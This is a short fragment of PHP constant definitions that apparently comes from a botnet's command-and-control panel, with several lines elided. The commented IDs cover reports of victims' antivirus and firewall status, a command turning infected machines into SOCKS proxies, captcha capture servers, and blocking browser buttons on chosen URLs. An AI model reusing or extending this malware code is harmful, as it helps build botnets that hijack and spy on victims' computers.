...
$_COMMON_DEFINE['SBCID_ANTIVIRUS']             = '10020'; //String with AV info on the system.
$_COMMON_DEFINE['SBCID_ANTISPYWARE']           = '10021'; //String with antispyware info on the system.
$_COMMON_DEFINE['SBCID_FIREWALL']              = '10022'; //String with firewall info on the system.
$_COMMON_DEFINE['SBCID_MALWARE_ID']            = '10023'; //ID of malware that was removed from system
$_COMMON_DEFINE['SBCID_SOCKS_REQUEST']         = '10024'; //When server sends this to bot - bot is serving socks server.
...
$_COMMON_DEFINE['CFGID_CAPTCHA_SERVER']        = '20009'; //Captcha upload server URL.
$_COMMON_DEFINE['CFGID_CAPTCHA_LIST']          = '20010'; //Captcha capture entry.
$_COMMON_DEFINE['CFGID_NOTIFY_SERVER']         = '20011'; //Notify server URL.
$_COMMON_DEFINE['CFGID_NOTIFY_LIST']           = '20012'; //URL on which notify server will be notified.
$_COMMON_DEFINE['CFGID_REFRESH_BLOCK_LIST']    = '20013'; //List of URLs that browser buttons will be blocked on.
...
$_COMMON_DEFINE['BLT_MODULE_REPORT']           = '30';  //Module report.
